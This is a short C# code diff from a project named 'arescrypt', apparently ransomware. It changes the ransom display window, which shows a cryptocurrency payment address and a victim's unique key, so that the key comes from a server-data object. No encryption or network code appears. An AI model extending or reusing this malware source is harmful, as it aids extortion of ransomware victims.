@@ -11,6 +11,7 @@ namespace arescrypt
         [DllImport("user32.dll")]
         static extern void mouse_event(uint dwflag);
         static Configuration config = new Configuration();
+        static ServerData serveData = new ServerData();
 
         public Display() {
             InitializeComponent();
@@ -23,9 +24,8 @@ namespace arescrypt
             }
 
             this.cryptoAddress.Text = config.cryptoAddress;
-            this.uniqueKeyDIsplay.Text = config.uniqueKey;
-        }
-        
+            this.uniqueKeyDisplay.Text = serveData.uniqueKey;
+        }        
         
         private void lostTimer_Tick(object sender, EventArgs e)
         {
